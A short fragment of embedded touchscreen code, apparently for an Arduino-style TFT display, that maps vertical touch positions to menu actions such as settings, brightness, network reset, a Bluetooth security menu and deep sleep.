  if (tft.getTouch(&touchX, &touchY)) {
    if (touchY < 40) {
      displayMenu();
    } else if (touchY < 80) {
      showScrollBar();
    } else if (touchY < 120) {
      displaySettingsMenu();
    } else if (touchY < 160) {
      adjustBrightness();
    } else if (touchY < 200) {
      resetNetworkSettings();
    } else if (touchY < 240) {
      displayBluetoothSecurityMenu();
    } else {
      enterDeepSleep();
    }
  }
}
